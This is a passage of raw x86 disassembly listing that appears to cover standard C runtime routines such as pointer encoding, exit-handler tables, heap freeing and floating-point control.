  403824:	8b 45 08             	mov    0x8(%ebp),%eax
  403827:	85 c0                	test   %eax,%eax
  403829:	74 1a                	je     0x403845
  40382b:	83 f8 01             	cmp    $0x1,%eax
  40382e:	74 15                	je     0x403845
  403830:	e8 06 10 00 00       	call   0x40483b
  403835:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40383b:	e8 03 0e 00 00       	call   0x404643
  403840:	83 c8 ff             	or     $0xffffffff,%eax
  403843:	5d                   	pop    %ebp
  403844:	c3                   	ret
  403845:	b9 d8 3d 41 00       	mov    $0x413dd8,%ecx
  40384a:	87 01                	xchg   %eax,(%ecx)
  40384c:	5d                   	pop    %ebp
  40384d:	c3                   	ret
  40384e:	b8 dc 3d 41 00       	mov    $0x413ddc,%eax
  403853:	c3                   	ret
  403854:	6a 0c                	push   $0xc
  403856:	68 68 17 41 00       	push   $0x411768
  40385b:	e8 b0 e8 ff ff       	call   0x402110
  403860:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  403864:	8b 45 08             	mov    0x8(%ebp),%eax
  403867:	ff 30                	push   (%eax)
  403869:	e8 f2 1d 00 00       	call   0x405660
  40386e:	59                   	pop    %ecx
  40386f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403873:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403876:	e8 0a 02 00 00       	call   0x403a85
  40387b:	8b f0                	mov    %eax,%esi
  40387d:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403880:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403887:	e8 0d 00 00 00       	call   0x403899
  40388c:	8b c6                	mov    %esi,%eax
  40388e:	e8 c3 e8 ff ff       	call   0x402156
  403893:	c2 0c 00             	ret    $0xc
  403896:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  403899:	8b 45 10             	mov    0x10(%ebp),%eax
  40389c:	ff 30                	push   (%eax)
  40389e:	e8 05 1e 00 00       	call   0x4056a8
  4038a3:	59                   	pop    %ecx
  4038a4:	c3                   	ret
  4038a5:	6a 0c                	push   $0xc
  4038a7:	68 88 17 41 00       	push   $0x411788
  4038ac:	e8 5f e8 ff ff       	call   0x402110
  4038b1:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  4038b5:	8b 45 08             	mov    0x8(%ebp),%eax
  4038b8:	ff 30                	push   (%eax)
  4038ba:	e8 a1 1d 00 00       	call   0x405660
  4038bf:	59                   	pop    %ecx
  4038c0:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4038c4:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4038c7:	e8 99 00 00 00       	call   0x403965
  4038cc:	8b f0                	mov    %eax,%esi
  4038ce:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4038d1:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4038d8:	e8 0d 00 00 00       	call   0x4038ea
  4038dd:	8b c6                	mov    %esi,%eax
  4038df:	e8 72 e8 ff ff       	call   0x402156
  4038e4:	c2 0c 00             	ret    $0xc
  4038e7:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4038ea:	8b 45 10             	mov    0x10(%ebp),%eax
  4038ed:	ff 30                	push   (%eax)
  4038ef:	e8 b4 1d 00 00       	call   0x4056a8
  4038f4:	59                   	pop    %ecx
  4038f5:	c3                   	ret
  4038f6:	8b ff                	mov    %edi,%edi
  4038f8:	55                   	push   %ebp
  4038f9:	8b ec                	mov    %esp,%ebp
  4038fb:	83 ec 0c             	sub    $0xc,%esp
  4038fe:	8b 45 08             	mov    0x8(%ebp),%eax
  403901:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  403904:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403907:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40390a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40390d:	50                   	push   %eax
  40390e:	ff 75 0c             	push   0xc(%ebp)
  403911:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403914:	50                   	push   %eax
  403915:	e8 8b ff ff ff       	call   0x4038a5
  40391a:	8b e5                	mov    %ebp,%esp
  40391c:	5d                   	pop    %ebp
  40391d:	c3                   	ret
  40391e:	8b ff                	mov    %edi,%edi
  403920:	55                   	push   %ebp
  403921:	8b ec                	mov    %esp,%ebp
  403923:	83 ec 0c             	sub    $0xc,%esp
  403926:	8b 45 08             	mov    0x8(%ebp),%eax
  403929:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  40392c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40392f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403932:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403935:	50                   	push   %eax
  403936:	ff 75 0c             	push   0xc(%ebp)
  403939:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40393c:	50                   	push   %eax
  40393d:	e8 12 ff ff ff       	call   0x403854
  403942:	8b e5                	mov    %ebp,%esp
  403944:	5d                   	pop    %ebp
  403945:	c3                   	ret
  403946:	8b ff                	mov    %edi,%edi
  403948:	55                   	push   %ebp
  403949:	8b ec                	mov    %esp,%ebp
  40394b:	a1 04 30 41 00       	mov    0x413004,%eax
  403950:	83 e0 1f             	and    $0x1f,%eax
  403953:	6a 20                	push   $0x20
  403955:	59                   	pop    %ecx
  403956:	2b c8                	sub    %eax,%ecx
  403958:	8b 45 08             	mov    0x8(%ebp),%eax
  40395b:	d3 c8                	ror    %cl,%eax
  40395d:	33 05 04 30 41 00    	xor    0x413004,%eax
  403963:	5d                   	pop    %ebp
  403964:	c3                   	ret
  403965:	8b ff                	mov    %edi,%edi
  403967:	55                   	push   %ebp
  403968:	8b ec                	mov    %esp,%ebp
  40396a:	83 ec 18             	sub    $0x18,%esp
  40396d:	a1 04 30 41 00       	mov    0x413004,%eax
  403972:	33 c5                	xor    %ebp,%eax
  403974:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403977:	8b c1                	mov    %ecx,%eax
  403979:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40397c:	53                   	push   %ebx
  40397d:	8b 00                	mov    (%eax),%eax
  40397f:	8b 18                	mov    (%eax),%ebx
  403981:	85 db                	test   %ebx,%ebx
  403983:	75 08                	jne    0x40398d
  403985:	83 c8 ff             	or     $0xffffffff,%eax
  403988:	e9 e9 00 00 00       	jmp    0x403a76
  40398d:	8b 15 04 30 41 00    	mov    0x413004,%edx
  403993:	56                   	push   %esi
  403994:	57                   	push   %edi
  403995:	8b 3b                	mov    (%ebx),%edi
  403997:	8b f2                	mov    %edx,%esi
  403999:	8b 5b 04             	mov    0x4(%ebx),%ebx
  40399c:	83 e6 1f             	and    $0x1f,%esi
  40399f:	33 fa                	xor    %edx,%edi
  4039a1:	89 75 ec             	mov    %esi,-0x14(%ebp)
  4039a4:	8b ce                	mov    %esi,%ecx
  4039a6:	33 da                	xor    %edx,%ebx
  4039a8:	d3 cf                	ror    %cl,%edi
  4039aa:	d3 cb                	ror    %cl,%ebx
  4039ac:	85 ff                	test   %edi,%edi
  4039ae:	0f 84 be 00 00 00    	je     0x403a72
  4039b4:	83 ff ff             	cmp    $0xffffffff,%edi
  4039b7:	0f 84 b5 00 00 00    	je     0x403a72
  4039bd:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4039c0:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  4039c3:	6a 20                	push   $0x20
  4039c5:	59                   	pop    %ecx
  4039c6:	2b ce                	sub    %esi,%ecx
  4039c8:	33 c0                	xor    %eax,%eax
  4039ca:	d3 c8                	ror    %cl,%eax
  4039cc:	33 c2                	xor    %edx,%eax
  4039ce:	83 eb 04             	sub    $0x4,%ebx
  4039d1:	3b df                	cmp    %edi,%ebx
  4039d3:	72 60                	jb     0x403a35
  4039d5:	39 03                	cmp    %eax,(%ebx)
  4039d7:	74 f5                	je     0x4039ce
  4039d9:	8b 33                	mov    (%ebx),%esi
  4039db:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4039de:	33 f2                	xor    %edx,%esi
  4039e0:	d3 ce                	ror    %cl,%esi
  4039e2:	8b ce                	mov    %esi,%ecx
  4039e4:	89 03                	mov    %eax,(%ebx)
  4039e6:	ff 15 60 c1 40 00    	call   *0x40c160
  4039ec:	ff d6                	call   *%esi
  4039ee:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4039f1:	8b 15 04 30 41 00    	mov    0x413004,%edx
  4039f7:	8b f2                	mov    %edx,%esi
  4039f9:	83 e6 1f             	and    $0x1f,%esi
  4039fc:	89 75 ec             	mov    %esi,-0x14(%ebp)
  4039ff:	8b 00                	mov    (%eax),%eax
  403a01:	8b 00                	mov    (%eax),%eax
  403a03:	8b 08                	mov    (%eax),%ecx
  403a05:	8b 40 04             	mov    0x4(%eax),%eax
  403a08:	33 ca                	xor    %edx,%ecx
  403a0a:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  403a0d:	33 c2                	xor    %edx,%eax
  403a0f:	8b ce                	mov    %esi,%ecx
  403a11:	d3 4d f8             	rorl   %cl,-0x8(%ebp)
  403a14:	d3 c8                	ror    %cl,%eax
  403a16:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403a19:	3b 4d f4             	cmp    -0xc(%ebp),%ecx
  403a1c:	75 0b                	jne    0x403a29
  403a1e:	6a 20                	push   $0x20
  403a20:	59                   	pop    %ecx
  403a21:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  403a24:	74 a0                	je     0x4039c6
  403a26:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403a29:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  403a2c:	8b f9                	mov    %ecx,%edi
  403a2e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403a31:	8b d8                	mov    %eax,%ebx
  403a33:	eb 8e                	jmp    0x4039c3
  403a35:	83 ff ff             	cmp    $0xffffffff,%edi
  403a38:	74 0d                	je     0x403a47
  403a3a:	57                   	push   %edi
  403a3b:	e8 cd 03 00 00       	call   0x403e0d
  403a40:	8b 15 04 30 41 00    	mov    0x413004,%edx
  403a46:	59                   	pop    %ecx
  403a47:	8b c2                	mov    %edx,%eax
  403a49:	33 d2                	xor    %edx,%edx
  403a4b:	83 e0 1f             	and    $0x1f,%eax
  403a4e:	6a 20                	push   $0x20
  403a50:	59                   	pop    %ecx
  403a51:	2b c8                	sub    %eax,%ecx
  403a53:	d3 ca                	ror    %cl,%edx
  403a55:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403a58:	33 15 04 30 41 00    	xor    0x413004,%edx
  403a5e:	8b 01                	mov    (%ecx),%eax
  403a60:	8b 00                	mov    (%eax),%eax
  403a62:	89 10                	mov    %edx,(%eax)
  403a64:	8b 01                	mov    (%ecx),%eax
  403a66:	8b 00                	mov    (%eax),%eax
  403a68:	89 50 04             	mov    %edx,0x4(%eax)
  403a6b:	8b 01                	mov    (%ecx),%eax
  403a6d:	8b 00                	mov    (%eax),%eax
  403a6f:	89 50 08             	mov    %edx,0x8(%eax)
  403a72:	5f                   	pop    %edi
  403a73:	33 c0                	xor    %eax,%eax
  403a75:	5e                   	pop    %esi
  403a76:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403a79:	33 cd                	xor    %ebp,%ecx
  403a7b:	5b                   	pop    %ebx
  403a7c:	e8 47 dd ff ff       	call   0x4017c8
  403a81:	8b e5                	mov    %ebp,%esp
  403a83:	5d                   	pop    %ebp
  403a84:	c3                   	ret
  403a85:	8b ff                	mov    %edi,%edi
  403a87:	55                   	push   %ebp
  403a88:	8b ec                	mov    %esp,%ebp
  403a8a:	83 ec 0c             	sub    $0xc,%esp
  403a8d:	8b c1                	mov    %ecx,%eax
  403a8f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403a92:	56                   	push   %esi
  403a93:	8b 00                	mov    (%eax),%eax
  403a95:	8b 30                	mov    (%eax),%esi
  403a97:	85 f6                	test   %esi,%esi
  403a99:	75 08                	jne    0x403aa3
  403a9b:	83 c8 ff             	or     $0xffffffff,%eax
  403a9e:	e9 1e 01 00 00       	jmp    0x403bc1
  403aa3:	a1 04 30 41 00       	mov    0x413004,%eax
  403aa8:	8b c8                	mov    %eax,%ecx
  403aaa:	53                   	push   %ebx
  403aab:	8b 1e                	mov    (%esi),%ebx
  403aad:	83 e1 1f             	and    $0x1f,%ecx
  403ab0:	57                   	push   %edi
  403ab1:	8b 7e 04             	mov    0x4(%esi),%edi
  403ab4:	33 d8                	xor    %eax,%ebx
  403ab6:	8b 76 08             	mov    0x8(%esi),%esi
  403ab9:	33 f8                	xor    %eax,%edi
  403abb:	33 f0                	xor    %eax,%esi
  403abd:	d3 cf                	ror    %cl,%edi
  403abf:	d3 ce                	ror    %cl,%esi
  403ac1:	d3 cb                	ror    %cl,%ebx
  403ac3:	3b fe                	cmp    %esi,%edi
  403ac5:	0f 85 b4 00 00 00    	jne    0x403b7f
  403acb:	2b f3                	sub    %ebx,%esi
  403acd:	b8 00 02 00 00       	mov    $0x200,%eax
  403ad2:	c1 fe 02             	sar    $0x2,%esi
  403ad5:	3b f0                	cmp    %eax,%esi
  403ad7:	77 02                	ja     0x403adb
  403ad9:	8b c6                	mov    %esi,%eax
  403adb:	8d 3c 30             	lea    (%eax,%esi,1),%edi
  403ade:	85 ff                	test   %edi,%edi
  403ae0:	75 03                	jne    0x403ae5
  403ae2:	6a 20                	push   $0x20
  403ae4:	5f                   	pop    %edi
  403ae5:	3b fe                	cmp    %esi,%edi
  403ae7:	72 1d                	jb     0x403b06
  403ae9:	6a 04                	push   $0x4
  403aeb:	57                   	push   %edi
  403aec:	53                   	push   %ebx
  403aed:	e8 9e 2c 00 00       	call   0x406790
  403af2:	6a 00                	push   $0x0
  403af4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403af7:	e8 11 03 00 00       	call   0x403e0d
  403afc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403aff:	83 c4 10             	add    $0x10,%esp
  403b02:	85 c9                	test   %ecx,%ecx
  403b04:	75 28                	jne    0x403b2e
  403b06:	6a 04                	push   $0x4
  403b08:	8d 7e 04             	lea    0x4(%esi),%edi
  403b0b:	57                   	push   %edi
  403b0c:	53                   	push   %ebx
  403b0d:	e8 7e 2c 00 00       	call   0x406790
  403b12:	6a 00                	push   $0x0
  403b14:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403b17:	e8 f1 02 00 00       	call   0x403e0d
  403b1c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403b1f:	83 c4 10             	add    $0x10,%esp
  403b22:	85 c9                	test   %ecx,%ecx
  403b24:	75 08                	jne    0x403b2e
  403b26:	83 c8 ff             	or     $0xffffffff,%eax
  403b29:	e9 91 00 00 00       	jmp    0x403bbf
  403b2e:	8d 04 b1             	lea    (%ecx,%esi,4),%eax
  403b31:	8b d9                	mov    %ecx,%ebx
  403b33:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403b36:	8d 34 b9             	lea    (%ecx,%edi,4),%esi
  403b39:	a1 04 30 41 00       	mov    0x413004,%eax
  403b3e:	8b 7d fc             	mov    -0x4(%ebp),%edi
  403b41:	83 e0 1f             	and    $0x1f,%eax
  403b44:	6a 20                	push   $0x20
  403b46:	59                   	pop    %ecx
  403b47:	2b c8                	sub    %eax,%ecx
  403b49:	33 c0                	xor    %eax,%eax
  403b4b:	d3 c8                	ror    %cl,%eax
  403b4d:	8b cf                	mov    %edi,%ecx
  403b4f:	33 05 04 30 41 00    	xor    0x413004,%eax
  403b55:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403b58:	8b c6                	mov    %esi,%eax
  403b5a:	2b c7                	sub    %edi,%eax
  403b5c:	83 c0 03             	add    $0x3,%eax
  403b5f:	c1 e8 02             	shr    $0x2,%eax
  403b62:	3b f7                	cmp    %edi,%esi
  403b64:	1b d2                	sbb    %edx,%edx
  403b66:	f7 d2                	not    %edx
  403b68:	23 d0                	and    %eax,%edx
  403b6a:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403b6d:	74 10                	je     0x403b7f
  403b6f:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403b72:	33 c0                	xor    %eax,%eax
  403b74:	40                   	inc    %eax
  403b75:	89 11                	mov    %edx,(%ecx)
  403b77:	8d 49 04             	lea    0x4(%ecx),%ecx
  403b7a:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  403b7d:	75 f5                	jne    0x403b74
  403b7f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403b82:	8b 40 04             	mov    0x4(%eax),%eax
  403b85:	ff 30                	push   (%eax)
  403b87:	e8 ba fd ff ff       	call   0x403946
  403b8c:	53                   	push   %ebx
  403b8d:	89 07                	mov    %eax,(%edi)
  403b8f:	e8 98 df ff ff       	call   0x401b2c
  403b94:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  403b97:	8b 0b                	mov    (%ebx),%ecx
  403b99:	8b 09                	mov    (%ecx),%ecx
  403b9b:	89 01                	mov    %eax,(%ecx)
  403b9d:	8d 47 04             	lea    0x4(%edi),%eax
  403ba0:	50                   	push   %eax
  403ba1:	e8 86 df ff ff       	call   0x401b2c
  403ba6:	8b 0b                	mov    (%ebx),%ecx
  403ba8:	56                   	push   %esi
  403ba9:	8b 09                	mov    (%ecx),%ecx
  403bab:	89 41 04             	mov    %eax,0x4(%ecx)
  403bae:	e8 79 df ff ff       	call   0x401b2c
  403bb3:	8b 0b                	mov    (%ebx),%ecx
  403bb5:	83 c4 10             	add    $0x10,%esp
  403bb8:	8b 09                	mov    (%ecx),%ecx
  403bba:	89 41 08             	mov    %eax,0x8(%ecx)
  403bbd:	33 c0                	xor    %eax,%eax
  403bbf:	5f                   	pop    %edi
  403bc0:	5b                   	pop    %ebx
  403bc1:	5e                   	pop    %esi
  403bc2:	8b e5                	mov    %ebp,%esp
  403bc4:	5d                   	pop    %ebp
  403bc5:	c3                   	ret
  403bc6:	8b ff                	mov    %edi,%edi
  403bc8:	55                   	push   %ebp
  403bc9:	8b ec                	mov    %esp,%ebp
  403bcb:	ff 75 08             	push   0x8(%ebp)
  403bce:	68 e0 3d 41 00       	push   $0x413de0
  403bd3:	e8 5e 00 00 00       	call   0x403c36
  403bd8:	59                   	pop    %ecx
  403bd9:	59                   	pop    %ecx
  403bda:	5d                   	pop    %ebp
  403bdb:	c3                   	ret
  403bdc:	8b ff                	mov    %edi,%edi
  403bde:	55                   	push   %ebp
  403bdf:	8b ec                	mov    %esp,%ebp
  403be1:	51                   	push   %ecx
  403be2:	8d 45 08             	lea    0x8(%ebp),%eax
  403be5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403be8:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403beb:	50                   	push   %eax
  403bec:	6a 02                	push   $0x2
  403bee:	e8 03 fd ff ff       	call   0x4038f6
  403bf3:	59                   	pop    %ecx
  403bf4:	59                   	pop    %ecx
  403bf5:	8b e5                	mov    %ebp,%esp
  403bf7:	5d                   	pop    %ebp
  403bf8:	c3                   	ret
  403bf9:	8b ff                	mov    %edi,%edi
  403bfb:	55                   	push   %ebp
  403bfc:	8b ec                	mov    %esp,%ebp
  403bfe:	56                   	push   %esi
  403bff:	8b 75 08             	mov    0x8(%ebp),%esi
  403c02:	85 f6                	test   %esi,%esi
  403c04:	75 05                	jne    0x403c0b
  403c06:	83 c8 ff             	or     $0xffffffff,%eax
  403c09:	eb 28                	jmp    0x403c33
  403c0b:	8b 06                	mov    (%esi),%eax
  403c0d:	3b 46 08             	cmp    0x8(%esi),%eax
  403c10:	75 1f                	jne    0x403c31
  403c12:	a1 04 30 41 00       	mov    0x413004,%eax
  403c17:	83 e0 1f             	and    $0x1f,%eax
  403c1a:	6a 20                	push   $0x20
  403c1c:	59                   	pop    %ecx
  403c1d:	2b c8                	sub    %eax,%ecx
  403c1f:	33 c0                	xor    %eax,%eax
  403c21:	d3 c8                	ror    %cl,%eax
  403c23:	33 05 04 30 41 00    	xor    0x413004,%eax
  403c29:	89 06                	mov    %eax,(%esi)
  403c2b:	89 46 04             	mov    %eax,0x4(%esi)
  403c2e:	89 46 08             	mov    %eax,0x8(%esi)
  403c31:	33 c0                	xor    %eax,%eax
  403c33:	5e                   	pop    %esi
  403c34:	5d                   	pop    %ebp
  403c35:	c3                   	ret
  403c36:	8b ff                	mov    %edi,%edi
  403c38:	55                   	push   %ebp
  403c39:	8b ec                	mov    %esp,%ebp
  403c3b:	51                   	push   %ecx
  403c3c:	51                   	push   %ecx
  403c3d:	8d 45 08             	lea    0x8(%ebp),%eax
  403c40:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403c43:	8d 45 0c             	lea    0xc(%ebp),%eax
  403c46:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403c49:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403c4c:	50                   	push   %eax
  403c4d:	6a 02                	push   $0x2
  403c4f:	e8 ca fc ff ff       	call   0x40391e
  403c54:	59                   	pop    %ecx
  403c55:	59                   	pop    %ecx
  403c56:	8b e5                	mov    %ebp,%esp
  403c58:	5d                   	pop    %ebp
  403c59:	c3                   	ret
  403c5a:	68 78 35 41 00       	push   $0x413578
  403c5f:	b9 54 42 41 00       	mov    $0x414254,%ecx
  403c64:	e8 8a 2c 00 00       	call   0x4068f3
  403c69:	b0 01                	mov    $0x1,%al
  403c6b:	c3                   	ret
  403c6c:	68 e0 3d 41 00       	push   $0x413de0
  403c71:	e8 83 ff ff ff       	call   0x403bf9
  403c76:	c7 04 24 ec 3d 41 00 	movl   $0x413dec,(%esp)
  403c7d:	e8 77 ff ff ff       	call   0x403bf9
  403c82:	59                   	pop    %ecx
  403c83:	b0 01                	mov    $0x1,%al
  403c85:	c3                   	ret
  403c86:	b0 01                	mov    $0x1,%al
  403c88:	c3                   	ret
  403c89:	e8 04 f7 ff ff       	call   0x403392
  403c8e:	b0 01                	mov    $0x1,%al
  403c90:	c3                   	ret
  403c91:	a1 04 30 41 00       	mov    0x413004,%eax
  403c96:	56                   	push   %esi
  403c97:	6a 20                	push   $0x20
  403c99:	83 e0 1f             	and    $0x1f,%eax
  403c9c:	33 f6                	xor    %esi,%esi
  403c9e:	59                   	pop    %ecx
  403c9f:	2b c8                	sub    %eax,%ecx
  403ca1:	d3 ce                	ror    %cl,%esi
  403ca3:	33 35 04 30 41 00    	xor    0x413004,%esi
  403ca9:	56                   	push   %esi
  403caa:	e8 05 09 00 00       	call   0x4045b4
  403caf:	56                   	push   %esi
  403cb0:	e8 6f 2c 00 00       	call   0x406924
  403cb5:	56                   	push   %esi
  403cb6:	e8 16 2e 00 00       	call   0x406ad1
  403cbb:	56                   	push   %esi
  403cbc:	e8 67 f1 ff ff       	call   0x402e28
  403cc1:	56                   	push   %esi
  403cc2:	e8 c5 f9 ff ff       	call   0x40368c
  403cc7:	83 c4 14             	add    $0x14,%esp
  403cca:	b0 01                	mov    $0x1,%al
  403ccc:	5e                   	pop    %esi
  403ccd:	c3                   	ret
  403cce:	6a 00                	push   $0x0
  403cd0:	e8 1a e8 ff ff       	call   0x4024ef
  403cd5:	59                   	pop    %ecx
  403cd6:	c3                   	ret
  403cd7:	a1 70 35 41 00       	mov    0x413570,%eax
  403cdc:	83 c9 ff             	or     $0xffffffff,%ecx
  403cdf:	56                   	push   %esi
  403ce0:	f0 0f c1 08          	lock xadd %ecx,(%eax)
  403ce4:	75 1b                	jne    0x403d01
  403ce6:	a1 70 35 41 00       	mov    0x413570,%eax
  403ceb:	be 50 33 41 00       	mov    $0x413350,%esi
  403cf0:	3b c6                	cmp    %esi,%eax
  403cf2:	74 0d                	je     0x403d01
  403cf4:	50                   	push   %eax
  403cf5:	e8 13 01 00 00       	call   0x403e0d
  403cfa:	59                   	pop    %ecx
  403cfb:	89 35 70 35 41 00    	mov    %esi,0x413570
  403d01:	ff 35 78 42 41 00    	push   0x414278
  403d07:	e8 01 01 00 00       	call   0x403e0d
  403d0c:	ff 35 7c 42 41 00    	push   0x41427c
  403d12:	33 f6                	xor    %esi,%esi
  403d14:	89 35 78 42 41 00    	mov    %esi,0x414278
  403d1a:	e8 ee 00 00 00       	call   0x403e0d
  403d1f:	ff 35 20 3e 41 00    	push   0x413e20
  403d25:	89 35 7c 42 41 00    	mov    %esi,0x41427c
  403d2b:	e8 dd 00 00 00       	call   0x403e0d
  403d30:	ff 35 24 3e 41 00    	push   0x413e24
  403d36:	89 35 20 3e 41 00    	mov    %esi,0x413e20
  403d3c:	e8 cc 00 00 00       	call   0x403e0d
  403d41:	83 c4 10             	add    $0x10,%esp
  403d44:	89 35 24 3e 41 00    	mov    %esi,0x413e24
  403d4a:	b0 01                	mov    $0x1,%al
  403d4c:	5e                   	pop    %esi
  403d4d:	c3                   	ret
  403d4e:	68 70 cb 40 00       	push   $0x40cb70
  403d53:	68 f8 ca 40 00       	push   $0x40caf8
  403d58:	e8 c6 2a 00 00       	call   0x406823
  403d5d:	59                   	pop    %ecx
  403d5e:	59                   	pop    %ecx
  403d5f:	c3                   	ret
  403d60:	68 70 cb 40 00       	push   $0x40cb70
  403d65:	68 f8 ca 40 00       	push   $0x40caf8
  403d6a:	e8 37 2b 00 00       	call   0x4068a6
  403d6f:	59                   	pop    %ecx
  403d70:	59                   	pop    %ecx
  403d71:	c3                   	ret
  403d72:	8b ff                	mov    %edi,%edi
  403d74:	55                   	push   %ebp
  403d75:	8b ec                	mov    %esp,%ebp
  403d77:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403d7a:	8b 45 0c             	mov    0xc(%ebp),%eax
  403d7d:	81 e1 ff ff f7 ff    	and    $0xfff7ffff,%ecx
  403d83:	23 c1                	and    %ecx,%eax
  403d85:	56                   	push   %esi
  403d86:	8b 75 08             	mov    0x8(%ebp),%esi
  403d89:	a9 e0 fc f0 fc       	test   $0xfcf0fce0,%eax
  403d8e:	74 24                	je     0x403db4
  403d90:	85 f6                	test   %esi,%esi
  403d92:	74 0d                	je     0x403da1
  403d94:	6a 00                	push   $0x0
  403d96:	6a 00                	push   $0x0
  403d98:	e8 2b 30 00 00       	call   0x406dc8
  403d9d:	59                   	pop    %ecx
  403d9e:	59                   	pop    %ecx
  403d9f:	89 06                	mov    %eax,(%esi)
  403da1:	e8 95 0a 00 00       	call   0x40483b
  403da6:	6a 16                	push   $0x16
  403da8:	5e                   	pop    %esi
  403da9:	89 30                	mov    %esi,(%eax)
  403dab:	e8 93 08 00 00       	call   0x404643
  403db0:	8b c6                	mov    %esi,%eax
  403db2:	eb 1a                	jmp    0x403dce
  403db4:	51                   	push   %ecx
  403db5:	ff 75 0c             	push   0xc(%ebp)
  403db8:	85 f6                	test   %esi,%esi
  403dba:	74 09                	je     0x403dc5
  403dbc:	e8 07 30 00 00       	call   0x406dc8
  403dc1:	89 06                	mov    %eax,(%esi)
  403dc3:	eb 05                	jmp    0x403dca
  403dc5:	e8 fe 2f 00 00       	call   0x406dc8
  403dca:	59                   	pop    %ecx
  403dcb:	59                   	pop    %ecx
  403dcc:	33 c0                	xor    %eax,%eax
  403dce:	5e                   	pop    %esi
  403dcf:	5d                   	pop    %ebp
  403dd0:	c3                   	ret
  403dd1:	6a 0c                	push   $0xc
  403dd3:	68 a8 17 41 00       	push   $0x4117a8
  403dd8:	e8 d3 6c 00 00       	call   0x40aab0
  403ddd:	e8 48 05 00 00       	call   0x40432a
  403de2:	8b 70 0c             	mov    0xc(%eax),%esi
  403de5:	85 f6                	test   %esi,%esi
  403de7:	74 1e                	je     0x403e07
  403de9:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403ded:	8b ce                	mov    %esi,%ecx
  403def:	ff 15 60 c1 40 00    	call   *0x40c160
  403df5:	ff d6                	call   *%esi
  403df7:	eb 07                	jmp    0x403e00
  403df9:	33 c0                	xor    %eax,%eax
  403dfb:	40                   	inc    %eax
  403dfc:	c3                   	ret
  403dfd:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403e00:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403e07:	e8 89 00 00 00       	call   0x403e95
  403e0c:	cc                   	int3
  403e0d:	8b ff                	mov    %edi,%edi
  403e0f:	55                   	push   %ebp
  403e10:	8b ec                	mov    %esp,%ebp
  403e12:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403e16:	74 2d                	je     0x403e45
  403e18:	ff 75 08             	push   0x8(%ebp)
  403e1b:	6a 00                	push   $0x0
  403e1d:	ff 35 60 42 41 00    	push   0x414260
  403e23:	ff 15 f8 c0 40 00    	call   *0x40c0f8
  403e29:	85 c0                	test   %eax,%eax
  403e2b:	75 18                	jne    0x403e45
  403e2d:	56                   	push   %esi
  403e2e:	e8 08 0a 00 00       	call   0x40483b
  403e33:	8b f0                	mov    %eax,%esi
  403e35:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  403e3b:	50                   	push   %eax
  403e3c:	e8 81 09 00 00       	call   0x4047c2
  403e41:	59                   	pop    %ecx
  403e42:	89 06                	mov    %eax,(%esi)
  403e44:	5e                   	pop    %esi
  403e45:	5d                   	pop    %ebp
  403e46:	c3                   	ret
  403e47:	8b ff                	mov    %edi,%edi
  403e49:	55                   	push   %ebp
  403e4a:	8b ec                	mov    %esp,%ebp
  403e4c:	56                   	push   %esi
  403e4d:	8b 75 08             	mov    0x8(%ebp),%esi
  403e50:	83 fe e0             	cmp    $0xffffffe0,%esi
  403e53:	77 30                	ja     0x403e85
  403e55:	85 f6                	test   %esi,%esi
  403e57:	75 17                	jne    0x403e70
  403e59:	46                   	inc    %esi
  403e5a:	eb 14                	jmp    0x403e70
  403e5c:	e8 b8 f9 ff ff       	call   0x403819
  403e61:	85 c0                	test   %eax,%eax
  403e63:	74 20                	je     0x403e85
